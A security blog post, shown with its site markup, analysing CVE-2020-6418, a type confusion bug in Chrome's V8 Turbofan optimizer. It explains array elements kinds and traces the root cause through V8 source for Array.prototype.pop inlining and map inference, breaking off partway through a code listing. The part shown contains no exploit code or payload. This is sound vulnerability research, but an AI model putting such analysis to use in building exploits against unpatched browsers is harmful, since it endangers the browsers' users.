<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>CVE-2020-6418 Type Confusion V8 - Arzedlab ü™µ</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Type confusion in V8 in Google Chrome prior to 80.0.3987.122 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page." />
	<meta property="og:image" content=""/>
	<meta property="og:url" content="http://localhost:1313/posts/cve-2020-6418-incorrect-optimization-52d04cb78c1e47608e7874b83db5dcce/">
  <meta property="og:site_name" content="Arzedlab ü™µ">
  <meta property="og:title" content="CVE-2020-6418 Type Confusion V8">
  <meta property="og:description" content="Type confusion in V8 in Google Chrome prior to 80.0.3987.122 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-02-02T13:13:13+05:00">
    <meta property="article:modified_time" content="2024-02-02T13:13:13+05:00">
    <meta property="article:tag" content="CVE-2020-6418">
    <meta property="article:tag" content="Type Confusion">
    <meta property="article:tag" content="V8">
    <meta property="article:tag" content="Javascript">
    <meta property="article:tag" content="Turbofan">
    <meta property="article:tag" content="Compiler">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2020-6418 Type Confusion V8">
  <meta name="twitter:description" content="Type confusion in V8 in Google Chrome prior to 80.0.3987.122 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.">
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />

	
	

	
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">Arzedlab ü™µ</a>
	</div>
	<nav>
		
		<a href="/">üè† Home</a>
		
		<a href="/posts">üóÇÔ∏è All posts</a>
		
		<a href="/about">üí° About Me</a>
		
		<a href="/papers">üìë Publications</a>
		
		<a href="/tags">üè∑Ô∏è Tags</a>
		
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">CVE-2020-6418 Type Confusion V8</h1>
			<div class="meta">Posted on Feb 2, 2024</div>
		</div>
		

		
		<div class="toc">
		<strong>Table of contents:</strong>
		<nav id="TableOfContents">
  <ul>
    <li><a href="#research-done-by-ravshan-rikhsiev-2023"><strong>Research Done By Ravshan Rikhsiev (2023)</strong></a></li>
  </ul>
</nav>
		</div>

		<section class="body">
			<h1 id="cve-2020-6418--incorrect-optimization">CVE-2020-6418 | Incorrect Optimization</h1>
<h2 id="research-done-by-ravshan-rikhsiev-2023"><strong>Research Done By Ravshan Rikhsiev (2023)</strong></h2>
<table>
  <thead>
      <tr>
          <th><strong>Type Of Vulnerability</strong></th>
          <th>Type Confusion</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>Security Severity</strong></td>
          <td><strong>High</strong></td>
      </tr>
      <tr>
          <td><strong>Effected Components</strong></td>
          <td><strong>Javascript, Turbofan, Optimizer</strong></td>
      </tr>
      <tr>
          <td><strong>Issue Source</strong></td>
          <td><a href="https://issues.chromium.org/issues/40051542">https://issues.chromium.org/issues/40051542</a></td>
      </tr>
      <tr>
          <td><strong>Writeup Source(s)</strong></td>
          <td>Later</td>
      </tr>
      <tr>
          <td><strong>Tested Version</strong></td>
          <td>V8 8.2.0</td>
      </tr>
      <tr>
          <td><strong>Vulnerable commit</strong></td>
          <td>bdaa7d66a37adcc1f1d81c9b0f834327a74ffe07</td>
      </tr>
  </tbody>
</table>
<p><strong>CVE-2020-6418</strong> is a security vulnerability that was identified in the V8 JavaScript engine, which is used in various web browsers including Google Chrome. This vulnerability was <em>reported by Clement Lecigne of Google&rsquo;s Threat Analysis Group on 2020-02-18</em> [1] and assigned CVE-2020-6418. It was classified as a type confusion bug in the V8 engine.</p>
<p>The vulnerability occurs due to an incorrect optimization in the V8 JavaScript engine. It allows an attacker to trigger a type confusion bug, leading to potential security risks.</p>
<p>The stable channel has been updated to 80.0.3987.122 for Windows, Mac, and Linux</p>
<h1 id="background"><strong>Background</strong></h1>
<p>The Turbofan compiler in the V8 JavaScript engine uses assumptions to determine the types of objects in dynamic languages like JavaScript. However, these assumptions can sometimes lead to issues with typing, such as when determining the type for operations like <code>a + 1</code>, where <code>a</code> could be a string or an integer. This can result in incorrect optimizations and potentially introduce security vulnerabilities like type confusion bugs.</p>
<p>During runtime, the Map (Hidden Class) [2] of objects can be altered based on different processes. For instance, consider a basic array containing integer values. [3]</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> array <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">3</span>];
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// elements kind: PACKED_SMI_ELEMENTS
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>array.push(<span style="color:#bd93f9">4.56</span>);
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// elements kind: PACKED_DOUBLE_ELEMENTS
</span></span></span></code></pre></div><p>Adding a string literal to the array changes its elements kind once again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> array <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">3</span>];
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// elements kind: PACKED_SMI_ELEMENTS
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>array.push(<span style="color:#bd93f9">4.56</span>);
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// elements kind: PACKED_DOUBLE_ELEMENTS
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>array.push(<span style="color:#f1fa8c">&#39;x&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// elements kind: PACKED_ELEMENTS
</span></span></span></code></pre></div><p>So far, we&rsquo;ve encountered three primary types of array elements, each associated with distinct internal representations:</p>
<ol>
<li><strong>Small integers (Smi)</strong>: These are compact integer values that fit within the size of a machine word without requiring extra memory allocation. They&rsquo;re utilized for efficient storage and processing of small integer numbers.</li>
<li><strong>Doubles</strong>: This category encompasses floating-point numbers and integers that cannot be represented as Smi values. Doubles offer a broader range of numerical representation compared to Smi values.</li>
<li><strong>Regular elements</strong>: These represent values that cannot be categorized as Smi or doubles. They provide a more general storage mechanism for array elements.</li>
</ol>
<p>It&rsquo;s important to note that elements kind transitions in V8 only proceed in one direction, moving from specific types (e.g., PACKED_SMI_ELEMENTS) to more general types (e.g., PACKED_ELEMENTS). Once an array is categorized as PACKED_ELEMENTS, it cannot revert to a more specific category such as PACKED_DOUBLE_ELEMENTS.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> array <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">4.56</span>, <span style="color:#f1fa8c">&#39;x&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// elements kind: PACKED_ELEMENTS
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>array.length; <span style="color:#6272a4">// 5
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>array[<span style="color:#bd93f9">9</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>; <span style="color:#6272a4">// array[5] until array[8] are now holes
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// elements kind: HOLEY_ELEMENTS
</span></span></span></code></pre></div><p>Additionally, V8 distinguishes between <code>packed</code> and <code>holey</code> array kinds. When an array contains holes (empty slots), it transitions from a packed representation to a holey representation. This change occurs dynamically during runtime, and it impacts the efficiency of array operations.</p>
<p>In summary:</p>
<ul>
<li>V8 categorizes arrays based on their elements kind.</li>
<li>The elements kind of an array can change dynamically during runtime, transitioning from specific to more general categories.</li>
<li>Operations on packed arrays are typically more efficient than those on holey arrays due to optimized handling.</li>
<li>Each basic elements kind has both packed and holey variants, and transitions can occur between them.</li>
</ul>
<h1 id="root-cause-analysis"><strong>Root Cause Analysis</strong></h1>
<p>According n-day report by Google‚Äôs TAG [1], vulnerability lies in the function <code>NodeProperties::InferReceiverMapsUnsafe</code> in file <code>v8/src/compiler/node-properties.cc</code> .</p>
<p>And how we came to this vulnerability and how we catch it or trigger:</p>
<p>During an <strong>Inlining Phase,</strong> Turbofan will call <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-call-reducer.h;drc=f4a00cc248dd2dc8ec8759fb51620d47b5114090;l=39"><code>JSCallReducer</code></a> , it is fundamental mechasim to build simplified graph.</p>
<ul>
<li>
<p>Builltins inlined in two places in turbofan</p>
<ul>
<li>In the <code>JSCallReducer</code> that runs during the inlining and native context specialization pass, and</li>
<li>In the <code>JSBuiltinReducer</code> that runs during the typed lowering pass.</li>
</ul>
<p>The idea so far was that builtins which can only be inlined based on type information from the surrounding graph will be inlined late in the <code>JSBuiltinReducer</code>, whereas <em>higher order builtins</em> like for example <a href="https://tc39.github.io/ecma262/#sec-array.prototype.map">Array.prototype.map</a>, <a href="https://tc39.github.io/ecma262/#sec-function.prototype.apply">Function.prototype.apply</a> and <a href="https://tc39.github.io/ecma262/#sec-function.prototype.bind">Function.prototype.bind</a> that might provide additional inlining opportunities need to be handled early on in the <code>JSCallReducer</code>. [4]</p>
</li>
</ul>
<p>Turbofan will call <code>JSCallReducer::ReduceJSCall</code> to optimize the builtin function. The main logic is to jump to different optimization branches based on <code>builtin_id</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/compiler/js-call-reducer.cc#L3906
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Reduction JSCallReducer<span style="color:#ff79c6">::</span>ReduceJSCall(Node<span style="color:#ff79c6">*</span> node,
</span></span><span style="display:flex;"><span>                                      <span style="color:#ff79c6">const</span> SharedFunctionInfoRef<span style="color:#ff79c6">&amp;</span> shared) {
</span></span><span style="display:flex;"><span>  DCHECK_EQ(IrOpcode<span style="color:#ff79c6">::</span>kJSCall, node<span style="color:#ff79c6">-&gt;</span>opcode());
</span></span><span style="display:flex;"><span>  Node<span style="color:#ff79c6">*</span> target <span style="color:#ff79c6">=</span> NodeProperties<span style="color:#ff79c6">::</span>GetValueInput(node, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// Do not reduce calls to functions with break points.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> (shared.HasBreakInfo()) <span style="color:#ff79c6">return</span> NoChange();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// Raise a TypeError if the {target} is a &#34;classConstructor&#34;.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> (IsClassConstructor(shared.kind())) {...}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// Check for known builtin functions.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> builtin_id <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      shared.HasBuiltinId() <span style="color:#ff79c6">?</span> shared.builtin_id() <span style="color:#ff79c6">:</span> Builtins<span style="color:#ff79c6">::</span>kNoBuiltinId;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">switch</span> (builtin_id) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> Builtins<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kArrayConstructor</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> ReduceArrayConstructor(node);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> Builtins<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kBooleanConstructor</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> ReduceBooleanConstructor(node);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> Builtins<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kArrayPrototypePush</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> ReduceArrayPrototypePush(node);
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Here JSCallReducer::ReduceArrayPrototypePop jumps into optimized implementation of 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// Array.prototype.pop()
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">case</span> Builtins<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kArrayPrototypePop</span>:                                           
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> ReduceArrayPrototypePop(node);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>In this context, <code>Builtins::kArrayPrototypePop</code> is selected for analysis, and jumps to the optimized implementation of <code>JSCallReducer::ReduceArrayPrototypePop</code>, which is specifically designed to handle the <code>Array.prototype.pop()</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/compiler/js-call-reducer.cc#L4911
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>Reduction JSCallReducer<span style="color:#ff79c6">::</span>ReduceArrayPrototypePop(Node<span style="color:#ff79c6">*</span> node) {
</span></span><span style="display:flex;"><span>  DisallowHeapAccessIf <span style="color:#50fa7b">disallow_heap_access</span>(should_disallow_heap_access());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  DCHECK_EQ(IrOpcode<span style="color:#ff79c6">::</span>kJSCall, node<span style="color:#ff79c6">-&gt;</span>opcode());
</span></span><span style="display:flex;"><span>  CallParameters <span style="color:#ff79c6">const</span><span style="color:#ff79c6">&amp;</span> p <span style="color:#ff79c6">=</span> CallParametersOf(node<span style="color:#ff79c6">-&gt;</span>op());
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (p.speculation_mode() <span style="color:#ff79c6">==</span> SpeculationMode<span style="color:#ff79c6">::</span>kDisallowSpeculation) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">NoChange</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//-&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  Node<span style="color:#ff79c6">*</span> receiver <span style="color:#ff79c6">=</span> NodeProperties<span style="color:#ff79c6">::</span>GetValueInput(node, <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>  Node<span style="color:#ff79c6">*</span> effect <span style="color:#ff79c6">=</span> NodeProperties<span style="color:#ff79c6">::</span>GetEffectInput(node);
</span></span><span style="display:flex;"><span>  Node<span style="color:#ff79c6">*</span> control <span style="color:#ff79c6">=</span> NodeProperties<span style="color:#ff79c6">::</span>GetControlInput(node);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  MapInference <span style="color:#50fa7b">inference</span>(broker(), receiver, effect);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>inference.HaveMaps()) <span style="color:#ff79c6">return</span> NoChange();
</span></span><span style="display:flex;"><span>  MapHandles <span style="color:#ff79c6">const</span><span style="color:#ff79c6">&amp;</span> receiver_maps <span style="color:#ff79c6">=</span> inference.GetMaps();
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//&lt;-
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>ElementsKind<span style="color:#ff79c6">&gt;</span> kinds;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>CanInlineArrayResizingBuiltin(broker(), receiver_maps, <span style="color:#ff79c6">&amp;</span>kinds)) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> inference.NoChange();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>dependencies()<span style="color:#ff79c6">-&gt;</span>DependOnNoElementsProtector()) UNREACHABLE();
</span></span><span style="display:flex;"><span>  inference.RelyOnMapsPreferStability(dependencies(), jsgraph(), <span style="color:#ff79c6">&amp;</span>effect,
</span></span><span style="display:flex;"><span>                                      control, p.feedback());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>Node<span style="color:#ff79c6">*&gt;</span> controls_to_merge;
</span></span><span style="display:flex;"><span>  std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>Node<span style="color:#ff79c6">*&gt;</span> effects_to_merge;
</span></span><span style="display:flex;"><span>  std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>Node<span style="color:#ff79c6">*&gt;</span> values_to_merge;
</span></span><span style="display:flex;"><span>  Node<span style="color:#ff79c6">*</span> value <span style="color:#ff79c6">=</span> jsgraph()<span style="color:#ff79c6">-&gt;</span>UndefinedConstant();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Node<span style="color:#ff79c6">*</span> receiver_elements_kind <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      LoadReceiverElementsKind(receiver, <span style="color:#ff79c6">&amp;</span>effect, <span style="color:#ff79c6">&amp;</span>control);
</span></span><span style="display:flex;"><span>  Node<span style="color:#ff79c6">*</span> next_control <span style="color:#ff79c6">=</span> control;
</span></span><span style="display:flex;"><span>  Node<span style="color:#ff79c6">*</span> next_effect <span style="color:#ff79c6">=</span> effect;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (size_t i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> kinds.size(); i<span style="color:#ff79c6">++</span>) {
</span></span><span style="display:flex;"><span>    ElementsKind kind <span style="color:#ff79c6">=</span> kinds[i];
</span></span><span style="display:flex;"><span>    control <span style="color:#ff79c6">=</span> next_control;
</span></span><span style="display:flex;"><span>    effect <span style="color:#ff79c6">=</span> next_effect;
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// We do not need branch for the last elements kind.
</span></span></span></code></pre></div><p>The main goal of the <code>JSCallReducer::ReduceArrayPrototypePop</code> function is to optimize the <code>pop</code> operation on arrays by efficiently handling the removal of the last element. This optimization relies on knowing the type of array elements, called <code>ElementsKind</code>. The optimization process involves:</p>
<ol>
<li>Determining the current length of the array based on its <code>ElementsKind</code>.</li>
<li>Calculating the new length after the <code>pop</code> operation.</li>
<li>Returning the last element that was removed from the array.</li>
<li>Marking the position of the removed element as <code>hole</code>.</li>
</ol>
<p><img src="Untitled.png" alt="Untitled"></p>
<p>To achieve this optimization, it&rsquo;s crucial to accurately infer the type of the array elements. This inference is done by <code>MapInference</code>, which examines the chain of effects to determine if the array&rsquo;s type is certain and if it&rsquo;s likely to change. If the array&rsquo;s type is reliably inferred, the optimization can proceed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/compiler/js-call-reducer.cc#L4911
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>Reduction JSCallReducer<span style="color:#ff79c6">::</span>ReduceArrayPrototypePop(Node<span style="color:#ff79c6">*</span> node) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  MapInference inference(broker(), receiver, effect);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>inference.HaveMaps()) <span style="color:#ff79c6">return</span> NoChange();
</span></span><span style="display:flex;"><span>  MapHandles <span style="color:#ff79c6">const</span><span style="color:#ff79c6">&amp;</span> receiver_maps <span style="color:#ff79c6">=</span> inference.GetMaps();
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p><code>MapInference</code> class calls its constructor method:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/compiler/map-inference.h#L25&amp;L95
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">MapInference</span> {
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">public</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>  MapInference(JSHeapBroker<span style="color:#ff79c6">*</span> broker, Node<span style="color:#ff79c6">*</span> object, Effect effect);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Records stability dependencies if possible, otherwise it inserts map
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// checks. Does nothing if maps were already reliable. Returns true iff
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// dependencies were taken.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">bool</span> RelyOnMapsPreferStability(CompilationDependencies<span style="color:#ff79c6">*</span> dependencies,
</span></span><span style="display:flex;"><span>                                 JSGraph<span style="color:#ff79c6">*</span> jsgraph, Node<span style="color:#ff79c6">**</span> effect, Node<span style="color:#ff79c6">*</span> control,
</span></span><span style="display:flex;"><span>                                 <span style="color:#ff79c6">const</span> FeedbackSource<span style="color:#ff79c6">&amp;</span> feedback);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/compiler/map-inference.cc#L18&amp;L120
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>MapInference<span style="color:#ff79c6">::</span>MapInference(JSHeapBroker<span style="color:#ff79c6">*</span> broker, Node<span style="color:#ff79c6">*</span> object, Node<span style="color:#ff79c6">*</span> effect)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">:</span> broker_(broker), object_(object) {
</span></span><span style="display:flex;"><span>  ZoneHandleSet<span style="color:#ff79c6">&lt;</span>Map<span style="color:#ff79c6">&gt;</span> maps;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">auto</span> result <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      NodeProperties<span style="color:#ff79c6">::</span>InferReceiverMapsUnsafe(broker_, object_, effect, <span style="color:#ff79c6">&amp;</span>maps);
</span></span><span style="display:flex;"><span>  maps_.insert(maps_.end(), maps.begin(), maps.end());
</span></span><span style="display:flex;"><span>  maps_state_ <span style="color:#ff79c6">=</span> (result <span style="color:#ff79c6">==</span> NodeProperties<span style="color:#ff79c6">::</span>kUnreliableReceiverMaps)
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">?</span> <span style="color:#8be9fd;font-style:italic">kUnreliableDontNeedGuard</span>
</span></span><span style="display:flex;"><span>                    : kReliableOrGuarded;
</span></span><span style="display:flex;"><span>  DCHECK_EQ(maps_.empty(), result <span style="color:#ff79c6">==</span> NodeProperties<span style="color:#ff79c6">::</span>kNoReceiverMaps);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> MapInference<span style="color:#ff79c6">::</span>RelyOnMapsPreferStability(
</span></span><span style="display:flex;"><span>    CompilationDependencies<span style="color:#ff79c6">*</span> dependencies, JSGraph<span style="color:#ff79c6">*</span> jsgraph, Node<span style="color:#ff79c6">**</span> effect,
</span></span><span style="display:flex;"><span>    Node<span style="color:#ff79c6">*</span> control, <span style="color:#ff79c6">const</span> FeedbackSource<span style="color:#ff79c6">&amp;</span> feedback) {
</span></span><span style="display:flex;"><span>  CHECK(HaveMaps());
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (Safe()) <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">false</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (RelyOnMapsViaStability(dependencies)) <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">true</span>;
</span></span><span style="display:flex;"><span>  CHECK(RelyOnMapsHelper(<span style="color:#ff79c6">nullptr</span>, jsgraph, effect, control, feedback));
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>In turn, the MapInference function calls <code>NodeProperties::InferReceiverMapsUnsafe</code> for reliable inference of object types:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/compiler/map-inference.cc#L337
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>NodeProperties<span style="color:#ff79c6">::</span>InferReceiverMapsResult NodeProperties<span style="color:#ff79c6">::</span>InferReceiverMapsUnsafe(
</span></span><span style="display:flex;"><span>    JSHeapBroker<span style="color:#ff79c6">*</span> broker, Node<span style="color:#ff79c6">*</span> receiver, Node<span style="color:#ff79c6">*</span> effect,
</span></span><span style="display:flex;"><span>    ZoneHandleSet<span style="color:#ff79c6">&lt;</span>Map<span style="color:#ff79c6">&gt;*</span> maps_return) {
</span></span><span style="display:flex;"><span>  HeapObjectMatcher <span style="color:#50fa7b">m</span>(receiver);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (m.HasValue()) {
</span></span><span style="display:flex;"><span>    HeapObjectRef receiver <span style="color:#ff79c6">=</span> m.Ref(broker);
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// We don&#39;t use ICs for the Array.prototype and the Object.prototype
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// because the runtime has to be able to intercept them properly, so
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// we better make sure that TurboFan doesn&#39;t outsmart the system here
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// by storing to elements of either prototype directly.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">//
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// TODO(bmeurer): This can be removed once the Array.prototype and
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// Object.prototype have NO_ELEMENTS elements kind.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>receiver.IsJSObject() <span style="color:#ff79c6">||</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">!</span>broker<span style="color:#ff79c6">-&gt;</span>IsArrayOrObjectPrototype(receiver.AsJSObject())) {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (receiver.map().is_stable()) {
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// The {receiver_map} is only reliable when we install a stability
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#6272a4">// code dependency.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">*</span>maps_return <span style="color:#ff79c6">=</span> ZoneHandleSet<span style="color:#ff79c6">&lt;</span>Map<span style="color:#ff79c6">&gt;</span>(receiver.map().object());
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> kUnreliableReceiverMaps;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
